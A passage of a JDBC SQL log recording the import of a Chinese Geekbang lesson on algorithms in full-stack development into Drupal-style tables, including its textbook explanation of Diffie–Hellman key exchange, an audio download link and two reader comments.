data-offset-key="2105:0" data-first-offset="true"><span data-slate-string="true">为了简化问题，我在一开始的时候讲了，我们不考虑并发的问题。现在，如果我们把上面无论哪一种算法的代码，改成支持多个线程并发访问的情形，即要求保证线程安全，你觉得需要对代码做怎样的修改呢？</span></span></span> 
</div> </div> <h2 class="se-ddd600b4" data-slate-type="heading" data-slate-object="block" data-key="2106"><span 
data-slate-object="text" data-key="2107"><span data-slate-leaf="true" data-offset-key="2107:0" 
data-first-offset="true"><span data-slate-string="true">选修课堂：Diffie–Hellman 密钥交换</span></span></span></h2> 
<div class="se-9a60631e " data-slate-type="paragraph" data-slate-object="block" data-key="2108"> 
<span data-slate-object="text" data-key="2109"><span data-slate-leaf="true" data-offset-key="2109:0" 
data-first-offset="true"><span data-slate-string="true">我们在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2110" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="2111"><span data-slate-leaf="true" data-offset-key="2111:0" data-first-offset="true"><span 
data-slate-string="true">[第 02 讲]</span></span></span></a><span data-slate-object="text" data-key="2112"><span 
data-slate-leaf="true" data-offset-key="2112:0" data-first-offset="true"><span data-slate-string="true"> 
中介绍 HTTPS 加密的时候，提到了 Pre-master Secret 生成的方式，其中一种就是 Diffie–Hellman 密钥交换这一算法的变种（如有遗忘，请回看），但是，我们并没有讲其中加密具体的算法原理。那么，下面我就来看一下 
Diffie–Hellman 密钥交换，这个常见的 HTTPS 加密算法，是怎样做到</span></span></span><span data-slate-object="text" 
data-key="2113"><span data-slate-leaf="true" data-offset-key="2113:0" data-first-offset="true"><span 
class="se-8ede1eac" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">正向计算简单、逆向求解困难</span></span></span></span><span 
data-slate-object="text" data-key="2114"><span data-slate-leaf="true" data-offset-key="2114:0" 
data-first-offset="true"><span data-slate-string="true">，来保证安全性的。</span></span></span> </div> 
<h3 class="se-2ca82886" data-slate-type="heading" data-slate-object="block" data-key="2115"><span 
data-slate-object="text" data-key="2116"><span data-slate-leaf="true" data-offset-key="2116:0" 
data-first-offset="true"><span data-slate-string="true">密钥计算过程</span></span></span></h3> <div 
class="se-906ac966 " data-slate-type="paragraph" data-slate-object="block" data-key="2117"> 
<span data-slate-object="text" data-key="2118"><span data-slate-leaf="true" data-offset-key="2118:0" 
data-first-offset="true"><span data-slate-string="true">Diffie–Hellman 密钥交换是一种在非保护信道中安全地创建共享密钥方法，它的出现在如今众所周知的 
RSA 算法发明之前。现在让我们来玩一个角色扮演游戏，假设你要和我进行通信，我们就来使用这种办法安全地创建共享密钥：</span></span></span> </div> <div 
class="se-b25a026d" data-slate-type="list" data-slate-object="block" data-key="2119"> <div 
class="se-266e69ee se-ef309b0d" data-slate-type="list-line" data-slate-object="block" data-key="2120"> 
<span data-slate-object="text" data-key="2121"><span data-slate-leaf="true" data-offset-key="2121:0" 
data-first-offset="true"><span data-slate-string="true">通信的你和我都协议商定了质数 p 和另一个底数 g；</span></span></span> 
</div> <div class="se-00d834b6 se-8b750545" data-slate-type="list-line" data-slate-object="block" 
data-key="2122"> <span data-slate-object="text" data-key="2123"><span data-slate-leaf="true" 
data-offset-key="2123:0" data-first-offset="true"><span data-slate-string="true">你呢，先生成一个只有你自己知道的随机整数 
a，并将结果 A = gᵃ mod p 发给我；</span></span></span> </div> <div class="se-5952ecf1 se-652e88cb" data-slate-type="list-line" 
data-slate-object="block" data-key="2124"> <span data-slate-object="text" data-key="2125"><span 
data-slate-leaf="true" data-offset-key="2125:0" data-first-offset="true"><span data-slate-string="true">我呢，也生成一个只有我自己知道的随机整数 
b，并将结果 B = gᵇ mod p 发给你；</span></span></span> </div> <div class="se-ad0f0dd9 se-7683c369" data-slate-type="list-line" 
data-slate-object="block" data-key="2126"> <span data-slate-object="text" data-key="2127"><span 
data-slate-leaf="true" data-offset-key="2127:0" data-first-offset="true"><span data-slate-string="true">你根据我发过来的 
B，计算得到 s = Bᵃ mod p；</span></span></span> </div> <div class="se-3840a8d0 se-3a00d239" data-slate-type="list-line" 
data-slate-object="block" data-key="2128"> <span data-slate-object="text" data-key="2129"><span 
data-slate-leaf="true" data-offset-key="2129:0" data-first-offset="true"><span data-slate-string="true">我根据你发过来的 
A，计算得到 s’ = Aᵇ mod p。</span></span></span> </div> </div> <div class="se-2e8602a0 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2130"> <span data-slate-object="text" data-key="2131"><span 
data-slate-leaf="true" data-offset-key="2131:0" data-first-offset="true"><span data-slate-string="true">这个过程用简单的图示来表示就是：</span></span></span> 
</div> <div class="se-86121caf" data-slate-type="image" data-slate-object="block" data-key="2132"> 
<img class="se-1c633cc3" src="https://static001.geekbang.org/resource/image/6d/3c/6d40d7bcf10858022fabf9c492626b3c.png"> 
</div> <div class="se-fdf87eff " data-slate-type="paragraph" data-slate-object="block" data-key="2133"> 
<span data-slate-object="text" data-key="2134"><span data-slate-leaf="true" data-offset-key="2134:0" 
data-first-offset="true"><span data-slate-string="true">你看，整个过程中，</span></span></span><span 
data-slate-object="text" data-key="2135"><span data-slate-leaf="true" data-offset-key="2135:0" 
data-first-offset="true"><span class="se-4356fd7c" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">只有 a、b 这两个数分别是你和我各自知道并保密的，而其它交换的数据全部都是公开的。</span></span></span></span><span 
data-slate-object="text" data-key="2136"><span data-slate-leaf="true" data-offset-key="2136:0" 
data-first-offset="true"><span data-slate-string="true">对于你来说，已经有了 a，又得到我传过来的 B，于是你算出了 s；对于我来说，已经有了 
b，又得到了你传过来的 A，于是我算出了 s’。</span></span></span> </div> <div class="se-472733be " data-slate-type="paragraph" 
data-slate-object="block" data-key="2137"> <span data-slate-object="text" data-key="2138"><span 
data-slate-leaf="true" data-offset-key="2138:0" data-first-offset="true"><span data-slate-string="true">有趣的是，经过计算，你得到的 
s 和我得到的 s’，这两个数总是相等的，既然相等，那这个值也就可以用作你我之间通信的对称密钥了。也就是说，</span></span></span><span data-slate-object="text" 
data-key="2139"><span data-slate-leaf="true" data-offset-key="2139:0" data-first-offset="true"><span 
class="se-910ede92" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">通信双方分别算得了相等的密钥，这也就避免了密钥传递的风险。</span></span></span></span><span 
data-slate-object="text" data-key="2140"><span data-slate-leaf="true" data-offset-key="2140:0" 
data-first-offset="true"><span data-slate-string="true">可是，为什么 s 和 s’ 它们是相等的呢？</span></span></span> 
</div> <h3 class="se-05157a80" data-slate-type="heading" data-slate-object="block" data-key="2141"><span 
data-slate-object="text" data-key="2142"><span data-slate-leaf="true" data-offset-key="2142:0" 
data-first-offset="true"><span data-slate-string="true">质数和模幂运算</span></span></span></h3> <div 
class="se-c77dbb67 " data-slate-type="paragraph" data-slate-object="block" data-key="2143"> 
<span data-slate-object="text" data-key="2144"><span data-slate-leaf="true" data-offset-key="2144:0" 
data-first-offset="true"><span data-slate-string="true">因为，g 的 a 次方再 b 次方，等于 g 的 b 次方再 a 次方，即便每次幂运算后加上 
p 来取模，也不影响最后结果的相等性，换言之：</span></span></span> </div> <div class="se-005a73c8 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2145"> <span data-slate-object="text" data-key="2146"><span 
data-slate-leaf="true" data-offset-key="2146:0" data-first-offset="true"><span class="se-12bb7da2" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">gᵃᵇ mod p = 
(gᵃ mod p)ᵇ mod p = (gᵇ mod p)ᵃ mod p</span></span></span></span> </div> <div class="se-aaca7211 
" data-slate-type="paragraph" data-slate-object="block" data-key="2147"> <span data-slate-object="text" 
data-key="2148"><span data-slate-leaf="true" data-offset-key="2148:0" data-first-offset="true"><span 
data-slate-string="true">上面这样的，先求幂，再取模的运算，我们把它简单称为“模幂运算”。在实际应用中，g 可以取一个比较小的数，而 a、b 和 p，都要取非常大的数，而且 
p 往往会取一个“极大”的质数——因为质数在此会具备这样一个重要性质，模幂运算结果会在小于 p 的非负整数中均匀分布；而另外一个原因是，由于 g 的 a 次方或 b 次方会非常大，需要一个“上限”，一个使得生成的数无论是传输还是存储都能够可行的方法。</span></span></span><span 
data-slate-object="text" data-key="2149"><span data-slate-leaf="true" data-offset-key="2149:0" 
data-first-offset="true"><span class="se-68c7caa3" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">因此大质数 p 的取模运算被用来设定上限并将大数化小，且保持原有的逆向求解困难性。</span></span></span></span> 
</div> <div class="se-af773a35 " data-slate-type="paragraph" data-slate-object="block" data-key="2150"> 
<span data-slate-object="text" data-key="2151"><span data-slate-leaf="true" data-offset-key="2151:0" 
data-first-offset="true"><span data-slate-string="true">说到逆向求解的困难性，这是根据数学上</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2152" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="2153"><span data-slate-leaf="true" data-offset-key="2153:0" 
data-first-offset="true"><span data-slate-string="true">离散对数</span></span></span></a><span 
data-slate-object="text" data-key="2154"><span data-slate-leaf="true" data-offset-key="2154:0" 
data-first-offset="true"><span data-slate-string="true">求解的特性所决定的，具体说来，就是这样一个模幂等式：</span></span></span> 
</div> <div class="se-27c759fe " data-slate-type="paragraph" data-slate-object="block" data-key="2155"> 
<span data-slate-object="text" data-key="2156"><span data-slate-leaf="true" data-offset-key="2156:0" 
data-first-offset="true"><span class="se-711f0076" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">gᵃ mod p = A</span></span></span></span> </div> <div class="se-4663c483 
" data-slate-type="paragraph" data-slate-object="block" data-key="2157"> <span data-slate-object="text" 
data-key="2158"><span data-slate-leaf="true" data-offset-key="2158:0" data-first-offset="true"><span 
data-slate-string="true">从难度上看，该式具有如下三个特性：</span></span></span> </div> <div class="se-d2e658b2" 
data-slate-type="list" data-slate-object="block" data-key="2159"> <div class="se-15d009cd se-1af4d079" 
data-slate-type="list-line" data-slate-object="block" data-key="2160"> <span data-slate-object="text" 
data-key="2161"><span data-slate-leaf="true" data-offset-key="2161:0" data-first-offset="true"><span 
data-slate-string="true">特性 ①：已知 g、a 和 p，求 A 容易；</span></span></span> </div> <div class="se-112c46e9 
se-f12b50d1" data-slate-type="list-line" data-slate-object="block" data-key="2162"> <span data-slate-object="text" 
data-key="2163"><span data-slate-leaf="true" data-offset-key="2163:0" data-first-offset="true"><span 
data-slate-string="true">特性 ②：已知 g、p 和 A，求 a 困难；</span></span></span> </div> <div class="se-996c6b66 
se-d08a6780" data-slate-type="list-line" data-slate-object="block" data-key="2164"> <span data-slate-object="text" 
data-key="2165"><span data-slate-leaf="true" data-offset-key="2165:0" data-first-offset="true"><span 
data-slate-string="true">特性 ③：已知 a、p 和 A，求 g 也困难。</span></span></span> </div> </div> <div class="se-c9691c36 
" data-slate-type="paragraph" data-slate-object="block" data-key="2166"> <span data-slate-object="text" 
data-key="2167"><span data-slate-leaf="true" data-offset-key="2167:0" data-first-offset="true"><span 
data-slate-string="true">正好，Diffie–Hellman 密钥交换利用了其中的特性 ① 和特性 ②。比如 a 是超过 100 位的正整数，而 p 则达到了 
300 位，那么在这种情况下，如果有恶意的攻击者，得到了 g、p，截获了 A，但是他根据这些信息，考虑我们前面介绍的公式 A = gᵃ mod p，在现有科技能达到的算力下，几乎是无法求解出其中的 
a 来的。无法知道 a，无法进而求得对称密钥 s（因为 s 需要通过 Bᵃ mod p 求得），这就起到了加密的作用，这也是 Diffie–Hellman 密钥交换能够实现的原理。</span></span></span> 
</div> <h2 class="se-e0e6372b" data-slate-type="heading" data-slate-object="block" data-key="2168"><span 
data-slate-object="text" data-key="2169"><span data-slate-leaf="true" data-offset-key="2169:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-bedf3cff" data-slate-type="list" data-slate-object="block" data-key="2170"> <div 
class="se-be0f51da se-fcbacdcb" data-slate-type="list-line" data-slate-object="block" data-key="2171"> 
<span data-slate-object="text" data-key="2172"><span data-slate-leaf="true" data-offset-key="2172:0" 
data-first-offset="true"><span data-slate-string="true">【基础】文中我提到了算法的时间复杂度和空间复杂度，这是属于算法的基础知识。如果不太熟悉的话可以阅读一下这个</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2173" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="2174"><span data-slate-leaf="true" data-offset-key="2174:0" 
data-first-offset="true"><span data-slate-string="true">词条</span></span></span></a><span data-slate-object="text" 
data-key="2175"><span data-slate-leaf="true" data-offset-key="2175:0" data-first-offset="true"><span 
data-slate-string="true">，以及</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="2176" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="2177"><span 
data-slate-leaf="true" data-offset-key="2177:0" data-first-offset="true"><span data-slate-string="true">这篇</span></span></span></a><span 
data-slate-object="text" data-key="2178"><span data-slate-leaf="true" data-offset-key="2178:0" 
data-first-offset="true"><span data-slate-string="true">文章，而在</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2179" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="2180"><span data-slate-leaf="true" data-offset-key="2180:0" data-first-offset="true"><span 
data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" data-key="2181"><span 
data-slate-leaf="true" data-offset-key="2181:0" data-first-offset="true"><span data-slate-string="true">则有常见算法的时间复杂度列表。</span></span></span> 
</div> <div class="se-60410c76 se-b05e7ff3" data-slate-type="list-line" data-slate-object="block" 
data-key="2182"> <span data-slate-object="text" data-key="2183"><span data-slate-leaf="true" 
data-offset-key="2183:0" data-first-offset="true"><span data-slate-string="true">选修课堂中介绍的 Diffie–Hellman 
密钥交换利用了模幂公式的“正向计算简单，逆向求解困难”这一特点，这个特点非常重要，还有一个相关的技术 RSA 也利用了这一特点。本来我是把 RSA 加密技术的原理介绍和 Diffie–Hellman 
密钥交换放在一起讲述的，但是经过仔细斟酌，我觉得 RSA 涉及到的数学知识稍多，整体理解起来明显偏难，因此为了专栏内容和难度的一致性，我忍痛把它拿出去了，并放在了我自己的博客上，感兴趣的话可以</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2184" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="2185"><span data-slate-leaf="true" data-offset-key="2185:0" 
data-first-offset="true"><span data-slate-string="true">移步阅读</span></span></span></a><span 
data-slate-object="text" data-key="2186"><span data-slate-leaf="true" data-offset-key="2186:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> </div> 
<div class="se-6818cce2" data-slate-type="image" data-slate-object="block" data-key="2187"> 
<img class="se-5bcf8dc7" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 9, 9) 
 {executed in 20 msec}
2020-11-19 11:04:25.859 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=9 
 {executed in 0 msec}
2020-11-19 11:04:25.859 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:04:25.860 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=9 
 {executed in 0 msec}
2020-11-19 11:04:25.861 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:04:25.861 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605755065, 1605755065, 1, 'zh-hans', 0, 1, 1, 
0, '36丨全栈开发中的算法（上）', 1, 9, 9) 
 {executed in 0 msec}
2020-11-19 11:04:25.868 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=9 
 {executed in 0 msec}
2020-11-19 11:04:25.869 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:04:25.870 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605755065, 1605755065, 1, 'zh-hans', 0, 
1, 1, 0, '36丨全栈开发中的算法（上）', 'book', 1, 9, 9) 
 {executed in 0 msec}
2020-11-19 11:04:25.874 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.874 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:04:25.875 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.876 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:04:25.877 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/7012a1fef909c5f28a9324f3a0ad8b99?bkt=en-d3a65691252603d3d27a90d9cf97891234a720fc1fa5335ade0d9f54097fef248385be8be4d0e2c5&fid=3757516097-778750-151272083551477&time=1605755064&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-uzmSSH7BpbZW7Xh1CYeEVbxDleE%3D&to=92&size=13640677&sta_dx=13640677&sta_cs=3049&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575279319&mtime=1605754779&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=13640677&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-25a67b0cc95e2d91c07b649f05ce468c5244519c0db4a64960784616f92aa60e36e49b0a2872232a&sl=76480590&expires=8h&rt=pr&r=557137527&mlogid=7501982901290688934&vbdid=2247232042&fin=36%E4%B8%A8%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8A%EF%BC%89.m4a&bflag=92,34-92&rtype=1&dp-logid=7501982901290688934&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=5eee304bbb22b9c22d6de1337aaa5ca351f155d7cd719f6b305a5e1275657320&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=36%E4%B8%A8%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8A%EF%BC%89.m4a', 
9, 9) 
 {executed in 1 msec}
2020-11-19 11:04:25.880 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.881 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:04:25.882 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/7012a1fef909c5f28a9324f3a0ad8b99?bkt=en-d3a65691252603d3d27a90d9cf97891234a720fc1fa5335ade0d9f54097fef248385be8be4d0e2c5&fid=3757516097-778750-151272083551477&time=1605755064&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-uzmSSH7BpbZW7Xh1CYeEVbxDleE%3D&to=92&size=13640677&sta_dx=13640677&sta_cs=3049&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575279319&mtime=1605754779&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=13640677&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-25a67b0cc95e2d91c07b649f05ce468c5244519c0db4a64960784616f92aa60e36e49b0a2872232a&sl=76480590&expires=8h&rt=pr&r=557137527&mlogid=7501982901290688934&vbdid=2247232042&fin=36%E4%B8%A8%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8A%EF%BC%89.m4a&bflag=92,34-92&rtype=1&dp-logid=7501982901290688934&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=5eee304bbb22b9c22d6de1337aaa5ca351f155d7cd719f6b305a5e1275657320&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=36%E4%B8%A8%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8A%EF%BC%89.m4a', 
9, 9) 
 {executed in 0 msec}
2020-11-19 11:04:25.886 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.886 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:04:25.887 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.888 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:04:25.889 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>靠人品去赢</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-02 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 这篇文章，让我联想到秒杀活动的设计，反正就是不让你大流量直接进入到服务器就是了，想了一下所谓的秒杀，真的就是耍猴。 </div> 
<div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/4d/fd/0aa0e39f.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>许童童</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-02 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 老师的文章写得真好，读起来意犹未尽 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li>', 0, 'full_html', 'zh-hans', 
9, 9) 
 {executed in 1 msec}
2020-11-19 11:04:25.892 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.893 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

